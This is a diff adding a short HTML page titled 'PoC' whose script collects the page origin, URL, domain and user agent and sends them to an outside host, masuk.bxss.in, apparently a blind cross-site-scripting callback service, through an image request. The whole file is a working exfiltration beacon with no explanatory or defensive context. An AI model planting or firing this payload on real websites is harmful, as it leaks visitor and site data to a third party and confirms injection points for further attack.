@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>PoC</title>
+</head>
+<body>
+
+<script>
+(function () {
+    var d = [
+        "o=" + encodeURIComponent(location.origin),
+        "h=" + encodeURIComponent(location.href),
+        "d=" + encodeURIComponent(document.domain),
+        "u=" + encodeURIComponent(navigator.userAgent)
+    ].join("&");
+
+    new Image().src = "https://masuk.bxss.in/?" + d;
+})();
+</script>
+
+</body>
+</html>
